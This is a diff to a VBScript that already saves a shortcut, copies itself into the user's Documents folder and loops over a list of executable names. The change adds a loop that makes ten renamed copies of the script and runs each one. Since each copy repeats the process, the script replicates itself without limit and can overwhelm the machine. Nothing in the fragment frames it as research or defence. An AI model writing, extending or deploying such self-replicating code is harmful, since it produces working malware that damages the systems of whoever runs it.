@@ -10,11 +10,16 @@ objShellLink.Save
 
 ' Copy script to Documents folder
 strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
-fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName), True
+strScriptName = fso.GetFileName(WScript.ScriptFullName)
 
-' Copy script to Desktop folder
-strDesktopPath = WshShell.SpecialFolders("Desktop")
-fso.CopyFile WScript.ScriptFullName, strDesktopPath & "\" & fso.GetFileName(WScript.ScriptFullName), True
+' Create 10 copies of the script in the Documents folder
+For i = 1 to 10
+    strCopyName = "Copy" & i & "_" & strScriptName
+    fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & strCopyName, True
+    
+    ' Execute each copy of the script
+    WshShell.Run strDocumentsPath & "\" & strCopyName, 1, false
+Next
 
 Do
     For Each strExeName In strExeNames
